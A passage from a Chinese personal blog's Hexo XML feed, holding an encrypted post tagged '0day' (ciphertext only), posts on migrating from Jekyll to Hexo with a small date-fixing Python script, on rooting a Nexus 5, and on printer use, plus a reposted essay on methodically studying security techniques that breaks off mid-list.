9357df5006dfac8ed4a5e11e112fcf2c278f72bd4ae084ea34f8cd7e995165282f4359a328bc385c8e4a5f93c29799ece6250d8f30afd840cdcb711533fa0f29aa4375c663deaa54cfcc37c7d9850795ea657ee2518c16f620decf21e30e55c5655ce82fab428521b2e560eb7defacfef18cffb4a2d5a117fbc825b72a1d7444db2a9f7a6b53204f915b0c6d78e0689f151e47604129e5966e882293d3bc98e2d996a1ac1732fca30a24f0c89a99057c315b5dd34a7d067a1b87be5a39dd75aba430b6cda10eadb7a3faf170d6914bbdb5e2c8e326f69177e4b63c4fe47ee2d1dfd554f6f1b1a977751029c72aa214a15da10f866729c6a5ce60057d6ec18b6287e1cc0cf92265cdc3d0388f38b910bc989bf81678049f1c6003d5420aaa57290f90c66a0c1fc6b3d46440ff6b3099d69c046e70c67b522a577170307a9f2e851b79eeab625d7c11d28a2ba186f6372ee7a9ee128d7f336163d4b6344420896b7e5e7a1a2ef98e45c28b8fbadd6e4a8f9f9c92e4fd74a8c3cafdbea692ad81cbeff16fb6d96f6c10da696fc2154ed9667c46ec5f246c7a52b99819aef7c9902bc164f524e04743bc962b531fe9d277ad2ef7a55460b9f78b89da76205161d3c6a743173046d36867c827b359b2754a2e8fe73aa8bddac4bbb74ee8d3a595a5953fd21172deb87133d9a00bb9fbd351664dcf17f1a2ef57addacc53b593fda14ccf7c0f783ab328d1b2879fc9a7172c1d11b5521a0d68acd76bc5b962e0e57d847a1d70fd81bf5f7715935c14743c63c1c4051df313fa7a62a54452a456f61b12d093bbe59ffe5ed98f8608bda503cd5d40d4fd996978ead6cc0e573fec19dd7b043e9235e09719c0c3d8fecb21697e35d79093442cf0d0288deedea396e7df09945e689a5d8341fcce3077e0c73cb846e288f1a1043a62d2b775933c2dfa0a7a096c475a8961377aea7c034379a33240fb7a1a99848402b840607ac189e7b51cb1913e263577761c4bc7999862e6996dffae7902e1bb90c055739a00b875156482c079db18627318ca7350f62cbc11ec3ee5ed253214c542e066661687a2956994c08994b26269fad36fc270451b1ef3b6bf3005cc3fbb3ad4885614241c5ca00f3722c6cdf7324c41ea6dc1221c559009e25b8c9dfa262ec063b25028a43dd65c44a6355da60a3a149b340bc648d322c118159a0ae431689cd8590cfa62340166f9c00cd98662b0e95d214f87fa30aff60e0b3651040a76d153f4fcd1eea3aa1e9eadecc95130e0c9f8ffad33e6f62bff8ba46fb37d80fbad87729d5be80237bec72ec12629193ec2d6dd107b818e066be8ccf2b72d8fdbe55e7a10c6c32b65e833dfaa51a9180db0b726c2a503bfc58d08b7e1a4b6cb0dd68f48ecd16e706d6181fad1d42092614b3722748b4dd3120a5d163f69eb7ee3efad1b284529ad3fed6854232a738395b9f28b3229e6324ec07c2bd0f1855cd90ede6fe0a3ac8ee871dcbf61102e3789ff6aaa4f059851ba3752f6df83028b293ea18464729aaed21fb37d021900822dda18902b4bc43f2f8261e435adbb7543c54abd8b4fb05d06b3059b76177a986bb75f11a62a98fc77b747996008fc7b2bf0be32de1b4a81d6575d1de21ee0fb581547b21c26354d2252cbd1d01278bc7057a3819cbbaf6a502069dd35cb77b6e7eedc4d9f46b4ef44e2c4347ae4faa46bc3c9cf26ec42f9688c8217a133e179c1cb9655421853849e5219622f68fb5f5de1e8dedda292d2ec94fb29ff90ac6967bc618ee52d92baeb3dd26a7ecc2eafde7a89c273fb9e09213f4cc035c22ccd7f7794e7bb964a7c7499b29e4700bbff34b3e043f0f21e293f626e00d2c1f1e67683f7744c356459ca7e74039eb80f2520166db76387772e353ba0f59cf5c7ddcfca04a583f4f601e4f0ca6bb9e83b6574a8bd9df6c11b931f846c73c1fc29b79a3814aadbcd8561b2d07b46631c9d06999a0cac7fd1ac3c8086c29896d5fae016a3d56929f322d3ee8a8fc63d28a30ce9f1fb73e6ed0f180108f8eb87b32a42bbbd703f6c3a6ffe6a953de5c1fe0c8ef938b5b497803111558fc79612c6bfe76553cbc1b7d843df791b578329632df5ce77858f63033ed8fdc02b8c1268e312809dc999435dee540a49e6168d0c3b83decd67955fbabbf140b6be95a352e2da2a994fda14a9812e5a3421158ee836548395f744fd059ddb747793b3ead809496ff952cf3bf820fd0030a0cee0ab62d902dc6786c3009de2733d789148ff586f2a9e07882c8356d1ce1c81bf104a55b3bcef231ec101bf9e0d2ae9e8fded2c40c891e0b55fed5aa5b4d3398c7525246985c9aa79e359cd22a4c134561e72025e3161d24f34e5bab2cef2ad50f7b0508a973a8a65f6178812b2031906c01749b501cb2e9ba76bda7f1ea63e8b5f6dd3965825451b07bf696c3a84e526271c463a92b71566229f77252aaabcbe4b1df393ae384953da1bf1b29fc11e872a0e655ca77dd36790359def80ab259e8bfc4be6c60807742b97b1318528f66fd9a830f34ad6af3661fe068ef2168afa172ea822e6a92b97f8c235e715318ff39854a111d2d7e1a3e0f2f165518a90e4e8fbc2f55116cc283cefe4a30785bbacaac822c61d6920dcaa6a1ca3cea849c5f9e2995f46a8f870f44cc6d01f88ec2d55ac4b234b6839e8e3d12c36348f65740a1dacf54d6ffa3775eb53f9587e45f38dfff3e6fc5348c5541cfedc3a032f81eb6dc1cbaf1988d77fdf58825234b60fabe1d071e8cd7e6066e5b2b34665d58bc877775417ff485ac92c1f36cd3053b144d2ba70f3b0954e9b45b9cfcbabbfa3276d08fec2d98310079251f53693095f3aef67ed927421bc5c72b0125f38577658bb4dccb7f0609043427564f3fd301f158c2a5abbe6c6cc4887abb2523312b26aebabc0eee46c2ed122558c01829e4a935d0fb0a18ca81aeb5c4fb62a1a17d90b362f755acb00badb407bafe77be70aee0cf6d6fc73d88fcbe76b1f347975329fb5446ee1aa874fa0f5854416346fdfa420c04c6fffe427797c25d548d3a167704ac205bcdd10e6a46858172218a79ddb0a31b9fbdeba30a83efd2a48b2d441d58b840f872e03d1aa2ca90bbf1f2aff7854f4648474f57dc87088e39e33ed47f8596a6007acb0f8c7c20aafd226a89273f25544359531e4f1743b1a6a75e732671755d957b72ba56325bdf6542c8d26f8905639027827bab29f75aa63b48906221672dfec95a269d77591aa4de027bbbf9eafc6c00691e6e30d05ed67fccef082cf654365ab2db65745e237c856dc1ed28483bb624c8df0bb2f6a462ddfe0b3a308897e224217f618863ff828ce596b4c2c7bccc4be8da981fdd344646ccc57097e3d3d858ee8cc923ca83a3f889da6f0ae508ba0b536896b20de827522b5fa6708fb05b9ae6dbe2e732b7826105f773ed302e07d0135577b5e4924e22625cd1f4cedcfc7b637d10dd8f37949bc4ce80072dee174a067d1191a3625ba8c809fdea04a7e338d1f66dc0a96dc39674b561f906f2e1839d907da887b495decb30a253da9955e1d432690aa4d90b982841230d9563e7c822e2be9484bee110f5897c485c6fd94855f5cc5d303f328b84376b6677775055a79fdcc3fd99dfd3b32e26de0e7042cf1b222a13d0bd0c7ba6f8cc76441e5990a3cce922c28261771c2a4f9fe80a164f80569e43c4bcf949226a881042df1ad54e6d8de95bb233a8c6e48248ac87048b011ba06442ceabae3b6ceff2f5a330e103117cfd846739ee7fbdeafa203f427e7a23960f10b3ff98d341aad5d4cfe3af0444e554b9c41045a48b388925729147156821c852dd6375efe00e42b28dbbb581eeb7b64c7448ac37a918e7d20b612f8567bfd19798b95a41490e34ed3068f792f945083d6efca849fe3d53cd486252d7faaecd70ff661f0895eea3ecebc834b8eae0ee7b9c66a287df8728afdc65e97f3010562c26182c670037d5e33c664d3ef4b527dd060b5b04560efce5e33cbfc2f566a804ffbe9f8dccf4b2e0ee72be402be5f5a4083f0d34449522506a7d957f3dadd34a3d9f2106b3c8ece96f54e637b5a6e6965363f11de1f6f03a962390ba660107b682e29f8605b160e223ff440148e443b140d5858c403ce1eca2db738ac7ed47291618d78df96cae8fa0b5158781c214431d82f28c05da2121a73ef8829f6422eae2d378f6468cf166a32b4a4ccdac9d39c9dd25e82aa5da4338782d54afc3ac283fed88734c80f0820ad4c986c33c36828e626504a9bc392d9188ccffd5e5713ff750d988c66241fe6192d555c2a3aa2a30f37728f7635ac63af5c7602798d72a923354e321ae102fe38909298b90c9c8b5364c4a17bc701737a808639e733edbe49125a8114de462014a3d7b0452d205af13f8bbcabaffbb7961053f51bf3e5c7b60bd7b8bedfbb768abc6829ac05348d54d652562477cca4a773915a3bc15d2d36e8621523fa8f1d12966adaed1235b7c5ea78642dbaf7408bd3ec3735d86176a05bb52f43128df15f64ba7cf3c1c5635092ab00b8ba729ec00157aab097aa1b2652944e081c4e8e61727cd3780f84716a21cbe350647d10492e3581edd09f85ecf45066af6f91f3f8ab3ed4c6f91dd9d67ba65e8880983ea81b66caee05ffa987cc5895fa0a64fdfc4cee8fc676a9208283c9f1810f68b083e03e788a6cf2922361c3b87d13bd221e1ae03e428306be6939321efabac17d8c1afbeb825889e059352c5b4e93b15e36f2a93adfcf3802dfe7090b69f030d9c74d136ee678bd3c8118341eaa52dc1780123e5807f553d69099dd246adb093ed2a8eb83fe5503716519a71e3bd817e0a5331c92d1aa8f35641a4ff3cc023298c574a7720c29231f76e851938b1028b9a605ee522ee352574e6bbe468bb1682fd7d350e458afad2044c115de7ed80a39c8e72d72706d869171ee4403445cd03fe928e00a3d897ea60952ccd01839ca6217a9e5614fe1e7ba04f94f143103465346a2305d1f37419f3b91de5cfd28dd54aec9cbb34d388dbecd1e5919fc3692804f423e159e26abd443e9f468d8ce0bcbdc8c66a445f0a5672c421c78e32bbc9afde4927dc2cac1930e0c68da802431b18dc08af1fc5dc6db50e3998e2e2152cd0c8d6324d42ed4def9df21cc42a7b29cb37ae171d99f46ef798e5ed9e425316056ee9d6247c7915fe0b7c5865d7f957732ba93240379d2cb62a489e16bb9c5cfbcece2393874ec3fc4119c509a4c3e3d4fa923956cc2986c2a73e48b4ab70df580d72c79f67ec217ba45abc4d3c06162fffdabecb271f205926839168530e240536fa2ab350067d1907d0b7c3f21876db77b2b202257ee152a8d3e02f6cf19952ab8464c833a8abfd801b08c1a2ef7511205cb7e595457ee388e619d2028b7a3f7130d5d808f00d814a19fe2b6288f09ecdea537b19abb4c2ec175c4d6c4a00e8222e3d2c79411704d07c8e0ab8bce67191e65d6ad2242a4e519a138799059a5e8c1ff17af6042563a1daeaa8a2e2fc2f7b0857bb4dad194901fb38437328a55a2161bd5083abf057722b5c17697e946e84a5c8222205edf34561d19b5e177c476def59d56e716beecd98bbb301eb4bcd2bbaa7bd09ad44f45cb146c436f478d63e932465208b19d18a79448757de5d3f7b9b98f1eb50a5e77716851560330cd51015207213ff4d9938e7ab156fa4a453390c10b8fe52b04ed1cf5b4a6a1923e4260598d706785e69ee52f56c1a3976d678bb2b39fc54ebe7925753815592f948bbd48324bba3dba8659663bfac223afaf0a9f53484a6ef2665d50d1feb0d4c0b2da8404540057929b40f5ccd714e69a81047b58fc47fda56adff93644e75fd391fe33b84bcc951514807c9424cf980d9142e40bc46052455e6d58557ea2cec738f7c1cd60a0b589b6666b69a0de17f9739b0c9eb78edbddb81bc5619be7c12c01aa2eebd01c9b3ce9d075d15e0f6c59fe424a5e6ca36bcbf489535afd92e20503081faa465c1018236442acbed42818737f6a6af8a83cc57d6d43a9221fb2297028790c20adad94a208f953e2ed2304a104c07b61acb59ce1b177875caa048dce4dcebeb5b6bf93e06407f8a5e1c60a9363f2bca8fad76feba2e4fc938675c24e729d5201efe498998503cee845ac12edbf248d2155e3a3cd7fa01a1696b93b38994f514d2c806084d71c4afa973428fd89d4d974a95d86830480d9759ec09ca51665ff3e00e3d2b265a1a6c4724fbe516c7701977008d5e6258cc9dc967371b93ee131b6092c688928429c08faa3d5b3af121932de5f62697a7da1f5f9ef5e52c4cc06cd2430bdda460210aec82c576b16db832ecf0dd0ef884014dd9e540ca0d4b1aefb036e1a39e71810683699cbd21ca55af38f40481ec7166467f7c61b3300e97ae960cb73b1c4c97da878916157e36155f97263325747a3e356d8d8e7451f23426e9f5115b645cdab778fc0671389af1cbd2d1a723f381b15917348389f2098f26338081ce1df79139c31b787f6fda8194ae5604e691cbda91d6873d39dd5d8d8a19f5b3d8673324b2c404eaf9135737d2955aa06a3b434a4ce11132d537fa33a848563ecca77cc64dba194edc54288004d96e9af42a2e8e63950a70ea663d6b79d8ac5593e8382d65fab92e6a0e29f5935e64bde85797c07fa04f2e852c3937df118817c3e9af694ead5e42b887e1a642f3a3ac131e627b6ebfea91ee312a4a62fe047fd394fa0556872962308bfbd4db147d1a4e80efffffa10e17b77bda10f25d9b9ca134ce4c691b3625b0eae6b8331e907c5d51d34fed86c5ca7db6c8837a9ede23a22d8c17a1430cf9fac13345594a109de46457ef1447c61b8d2b7620fcdd0a9d6ee6aa52ab380613c77203773c12ad127dc40856a4d390c307f76f2d727e68c50134970c885174baa470012d9534036a0823376ea54f5d6a707b0e4ba26c07bfb1e6a1f4b77ada0ba566748c524281404fa31f04a5523597e1ae685f226f5594f566e549feb576c968d510192ae9a1483ad44f2f1d97fef7a967e9edb21bc9976c5f7bae4c7ebc4383f401fef6be8b9200155f093a898418432d1688ff61acaea5d71744c323e49ff144e8821f70e44bd89bcac3973191d7326c34018de57005166780d48be7b865e3702ee1036a3f755b5c45e0004dae4c9191c98ce6766f0395a9926f3bc7111242171a226ea9c73ea644dd5ced541d8f22bcde352ff00314599ea023eeebf98af5301dbf8a8057a68814584a9047babbe655776749964a36127f1401b2b7fe4f910f409bc5973cdc1c9e73aff4d00210622e7767a83eacc8824dce2735cb2fb29548aae214b4acb18aebc1f070454d39f2e2e700d5ff150d8e44a2a4229a4db6ec9b1a086c4f5448d6946b14e2443d705e80f49344728897965f535d5e3e01de7d0859770a58366072b7b13d049c2657fa21e8ae54c6487c2ee5f54aeec448f9aa37108f7730166ea332aeded0bdced6c0f41d9780ab27460b85b20ff6c383f246c338642784b6b1f9e79e23476dc238f72bb5f1dfa23340dd269395aa1a20ecd512276ac1f40a29b58cf33ac6208136b9ac98fe4c832bff17ea2b906b14b02f060a64835a323af06baae2025e0b660028de4fd32c414461cafa64cf5e712af8b78081264eb184456404ded98b3cc236a92c9ea1367df3c9c9abdee7b0a21496775cf73125e81af8a4e8cac9de4f7a652c566938b54962ed6db7e517b99800c698365d7955da6077ae6de6482f238f19b7819faa77</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>0day</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>migrate jekyll blog to hexo</title>
    <link href="/2021/05/21/migrate-jekyll-blog-to-hexo/"/>
    <url>/2021/05/21/migrate-jekyll-blog-to-hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo模板初始化"><a href="#hexo模板初始化" class="headerlink" title="hexo模板初始化"></a>hexo模板初始化</h1><p>mkdir test;cd test<br>#新建空目录<br>hexo init<br>初始化目录<br><img src="2.PNG" alt="2"></p><p>导入主题，cd themes<br>例如导入这个主题：<a href="https://github.com/next-theme/hexo-theme-next">https://github.com/next-theme/hexo-theme-next</a></p><p>git clone <a href="https://github.com/next-theme/hexo-theme-next">https://github.com/next-theme/hexo-theme-next</a> next</p><p><img src="3.PNG" alt="3"></p><p>修改配置文件</p><p><code>leafpad /home/kali/Documents/Whale3070.github.io/_config.yml</code></p><p>修改为next，就是theme文件夹下的next文件夹</p><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean"># Extensions<br>## Plugins: https:<span class="hljs-comment">//hexo.io/plugins/</span><br>## Themes: https:<span class="hljs-comment">//hexo.io/themes/</span><br>theme: next<br></code></pre></div></td></tr></table></figure><h2 id="添加加密功能"><a href="#添加加密功能" class="headerlink" title="添加加密功能"></a>添加加密功能</h2><ul><li>  <code>npm install --save hexo-blog-encrypt</code><br><img src="1.PNG" alt="1"></li></ul><p>文件头这样设置</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">Hello</span> <span class="hljs-string">World</span><br><span class="hljs-attr">tags:</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">encryptAsDiary</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2016-03-30 21:12:21</span><br><span class="hljs-attr">password:</span> <span class="hljs-string">mikemessi</span><br><span class="hljs-attr">abstract:</span> <span class="hljs-string">Here&#x27;s</span> <span class="hljs-string">something</span> <span class="hljs-string">encrypted,</span> <span class="hljs-string">password</span> <span class="hljs-string">is</span> <span class="hljs-string">required</span> <span class="hljs-string">to</span> <span class="hljs-string">continue</span> <span class="hljs-string">reading.</span><br><span class="hljs-attr">message:</span> <span class="hljs-string">Hey,</span> <span class="hljs-string">password</span> <span class="hljs-string">is</span> <span class="hljs-string">required</span> <span class="hljs-string">here.</span><br><span class="hljs-attr">wrong_pass_message:</span> <span class="hljs-string">Oh,</span> <span class="hljs-string">this</span> <span class="hljs-string">is</span> <span class="hljs-string">an</span> <span class="hljs-string">invalid</span> <span class="hljs-string">password.</span> <span class="hljs-string">Check</span> <span class="hljs-string">and</span> <span class="hljs-string">try</span> <span class="hljs-string">again,</span> <span class="hljs-string">please.</span><br><span class="hljs-attr">wrong_hash_message:</span> <span class="hljs-string">Oh,</span> <span class="hljs-string">these</span> <span class="hljs-string">decrypted</span> <span class="hljs-string">content</span> <span class="hljs-string">cannot</span> <span class="hljs-string">be</span> <span class="hljs-string">verified,</span> <span class="hljs-string">but</span> <span class="hljs-string">you</span> <span class="hljs-string">can</span> <span class="hljs-string">still</span> <span class="hljs-string">have</span> <span class="hljs-string">a</span> <span class="hljs-string">look.</span><br><span class="hljs-meta">---</span><br></code></pre></div></td></tr></table></figure><h2 id="博客迁移"><a href="#博客迁移" class="headerlink" title="博客迁移"></a>博客迁移</h2><p>之前是jekyll，因为jekyll的插件少，部分功能不方便</p><p>现在转而使用hexo</p><p>leafpad /home/kali/Documents/Whale3070.github.io/_config.yml</p><p>修改为<code>new_post_name: :year-:month-:day-:title.md</code></p><p>hexo server -p 5010</p><h2 id="更新图片地址"><a href="#更新图片地址" class="headerlink" title="更新图片地址"></a>更新图片地址</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Documents/</span>Whale3070.github.io<span class="hljs-regexp">/source/</span>_posts<br>sed -i <span class="hljs-string">&quot;s/images/img/g&quot;</span> *.md <br></code></pre></div></td></tr></table></figure><h2 id="修改md文件时间"><a href="#修改md文件时间" class="headerlink" title="修改md文件时间"></a>修改md文件时间</h2><p>cd /home/kali/Documents/Whale3070.github.io/source/_posts</p><p>ls &gt; filename.txt</p><p>运行以下py脚本，即可自动更新jekyll博客的时间</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">import os<br>import re<br><br>myre = <span class="hljs-string">&#x27;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;-\d&#123;2&#125;&#x27;</span><br>realtime = <span class="hljs-string">&#x27;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;&#x27;</span><br>yiliutime= <span class="hljs-string">&#x27;2016-\d&#123;2&#125;-\d&#123;2&#125;&#x27;</span><br>yiqitime= <span class="hljs-string">&#x27;2017-\d&#123;2&#125;-\d&#123;2&#125;&#x27;</span><br><br><br>f = open(<span class="hljs-string">&#x27;filename.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br><span class="hljs-attribute">findtime</span>=re.findall(myre,i)<br><span class="hljs-attribute">find2016time</span>=re.findall(yiliutime,i)<br><span class="hljs-attribute">find2017time</span>=re.findall(yiqitime,i)<br><span class="hljs-keyword">if</span> len(findtime) &gt; 0:<br><span class="hljs-attribute">findrealtime</span>=re.findall(realtime,findtime[0])<br>#<span class="hljs-builtin-name">print</span>(findrealtime)<br>command = <span class="hljs-string">&quot;sed -i \&#x27;2i date: &quot;</span>+findrealtime[0] + <span class="hljs-string">&quot; 00:00:00 \&#x27; &quot;</span> + findtime[0] + <span class="hljs-string">&quot;*.md&quot;</span><br><span class="hljs-builtin-name">print</span>(command)<br>os.system(command)<br>#<span class="hljs-keyword">if</span> len(find2016time)&gt;0:<br>#command2 = <span class="hljs-string">&quot;sed -i \&#x27;2i date: &quot;</span>+find2016time[0] + <span class="hljs-string">&quot; 00:00:00 \&#x27; &quot;</span> + find2016time[0] + <span class="hljs-string">&quot;*.md&quot;</span><br>#<span class="hljs-builtin-name">print</span>(command2)<br>#os.system(command2)<br>#<span class="hljs-keyword">if</span> len(find2017time)&gt;0:<br>#command3 = <span class="hljs-string">&quot;sed -i \&#x27;2i date: &quot;</span>+find2017time[0] + <span class="hljs-string">&quot; 00:00:00 \&#x27; &quot;</span> + find2017time[0] + <span class="hljs-string">&quot;*.md&quot;</span><br>#<span class="hljs-builtin-name">print</span>(command3)<br>#os.system(command3)<br><span class="hljs-comment">#sed -i &#x27;2i date 2021-05-15-10 21:12:21&#x27; 2021-05-15-10-x.md</span><br></code></pre></div></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://hexo.io/docs/commands">hexo的命令讲解</a></li><li><a href="https://github.com/D0n9X1n/hexo-blog-encrypt">hexo博客加密</a></li><li><a href="https://hexo.io/zh-cn/docs/migration">jekyll to hexo博客迁移</a></li><li><a href="https://github.com/next-theme/hexo-theme-next">https://github.com/next-theme/hexo-theme-next</a></li><li><a href="https://theme-next.org/index.html">next主题样式演示</a></li><li><a href="https://github.com/theme-next/hexo-theme-next">next主题下载</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小白Google nexus5 刷机步骤</title>
    <link href="/2021/05/15/10-x/"/>
    <url>/2021/05/15/10-x/</url>
    
    <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF-Auto-Root-hammerhead-hammerhead-nexus5.zip">https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF-Auto-Root-hammerhead-hammerhead-nexus5.zip</a></p><h2 id="连接到电脑"><a href="#连接到电脑" class="headerlink" title="连接到电脑"></a>连接到电脑</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-15-11/4.PNG"><br>这里我选择连接的是kali虚拟机</p><h2 id="手机关机"><a href="#手机关机" class="headerlink" title="手机关机"></a>手机关机</h2><p>长按右侧电源键，手机关机<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-15-11/6.jpg"></p><p>长按右侧电源键+音量减，手机进入下图的模式<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-15-11/5.jpg"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-15-11/7.jpg"></p><h2 id="kali执行脚本"><a href="#kali执行脚本" class="headerlink" title="kali执行脚本"></a>kali执行脚本</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-15-11/5.png"></p><p>然后等待<br>安卓图标变成一个红色的机器人<br>然后等待<br>手机重启开机<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-15-11/8.jpg"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-15-11/9.jpg"><br>就发现有了root权限了</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.online-tech-tips.com/smartphones/how-to-root-a-nexus-5-5x-6-6p-7/">https://www.online-tech-tips.com/smartphones/how-to-root-a-nexus-5-5x-6-6p-7/</a></p><p><a href="https://www.youtube.com/watch?v=b6OfB6UDNdQ">https://www.youtube.com/watch?v=b6OfB6UDNdQ</a></p>]]></content>
    
    
    <categories>
      
      <category>smartphone</category>
      
    </categories>
    
    
    <tags>
      
      <tag>smartphone</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hp打印机使用</title>
    <link href="/2021/05/07/10-x/"/>
    <url>/2021/05/07/10-x/</url>
    
    <content type="html"><![CDATA[<h1 id="hp打印机使用"><a href="#hp打印机使用" class="headerlink" title="hp打印机使用"></a>hp打印机使用</h1><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-07-10/1.PNG"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-07-10/2.PNG"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-07-10/3.PNG"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-07-10/4.jpg"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-07-10/5.PNG"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-07-10/6.PNG"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-07-10/7.PNG"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-07-10/8.png"></p>]]></content>
    
    
    <categories>
      
      <category>basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>basic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转载】高效学习攻防的一点思考及经验</title>
    <link href="/2021/05/05/02-x/"/>
    <url>/2021/05/05/02-x/</url>
    
    <content type="html"><![CDATA[<p>-&gt;当你拿到某个 “技术点”, 或是遇到某个什么所谓的”技巧” , 甚至是工具 之后,该如何进一步展开学习思考? </p><p>如下：</p><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean"><span class="hljs-number">1.</span>-&gt; 这TM 到底是个什么东西?<br><span class="hljs-number">2.</span>-&gt; <span class="hljs-string">&quot;正常情况下&quot;</span> 它都被用在什么地方? 平时主要拿它来干啥? 或者说这个东西可以协助解决一些什么样的实际业务问题 ?<br><span class="hljs-number">3.</span>-&gt; 它在<span class="hljs-string">&quot;正常情况下&quot;</span>, 具体是怎么运作的 ? 或者说其内部大致 实现原理 和 正常执行流程 是怎样的?<br><span class="hljs-number">4.</span>-&gt; 在实际渗透中我们到底能利用它来干些啥? 最终又能达到什么样的利用效果? 或者说它能帮我们避免或者解决一些什么样的实际渗透问题?<br><span class="hljs-number">5.</span>-&gt; 针对它所演化出来的具体利用场景都有哪些? 覆盖范围影响如何?<br><span class="hljs-number">6.</span>-&gt; 详细利用条件又是啥? 利用成功的限制条件是否苛刻? 对于自己现有的目标性质是否有继续深入研究的价值?<br><span class="hljs-number">7.</span>-&gt; 实际利用中可能会存在什么样的风险? 能否提前规避这些风险? 怎么规避? 万一误操作是否还能及时补救? 如何补救?<br><span class="hljs-number">8.</span>-&gt; 能否在其原有基础上进行针对性的改良利用,将其深度武器化而后直接付诸实战?<br><span class="hljs-number">9.</span>-&gt; 能否通过这个又联想到一些其它的衍生利用场景? 或者因此萌生出了一些比较另类优秀的利用思路?<br><span class="hljs-number">10.</span>-&gt; 仔细分析哪些情况下可能会直接导致利用失败?<br><span class="hljs-number">11.</span>-&gt; 如何从源头防御这种利用?<br><br>之后总结：<br>-&gt; 将以上问题的详细答案认真梳理总结,最后全部付诸于笔记或者文档<br>-&gt; 随着后续自己知识体系不断的完善加深和大量的实践经验积累,不停的去修改自己之前文章/笔记中的一些错误认知<br>-&gt; 最终,达到真正熟练掌握某个技术点甚至某个领域<br>-&gt; 以后攻防技术的发展趋势更多可能会越来越偏向于 <span class="hljs-string">&quot;专而精&quot;</span> ,而非 <span 